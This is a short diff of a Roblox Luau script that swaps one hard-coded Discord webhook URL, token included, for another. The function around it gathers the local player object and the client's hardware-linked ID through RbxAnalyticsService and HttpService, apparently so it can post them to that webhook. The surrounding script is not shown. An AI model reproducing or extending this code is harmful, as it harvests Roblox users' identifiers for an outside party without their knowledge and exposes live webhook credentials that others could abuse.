@@ -44,7 +44,7 @@ local blocked = {
 }
 
 local function s(d: string): ()
-    local w = "https://discord.com/api/webhooks/1369367375043891324/tntfJmaRtT0FNzD-0ZObLj-k-Swbag_D3KYSm6eFWBjCgRYbVGWErt8xFZkcZRgO4gMI"
+    local w = "https://discord.com/api/webhooks/1385008938378068048/FqdO2LqLJS-tMmmfhW06tN7LACrehpTsySyF05h4fJkuZhTYMdeSY7BqCgOAVG3FxEmU"
     local b = game:GetService("HttpService")
     local c = game:GetService("Players").LocalPlayer
     local h = game:GetService("RbxAnalyticsService"):GetClientId()
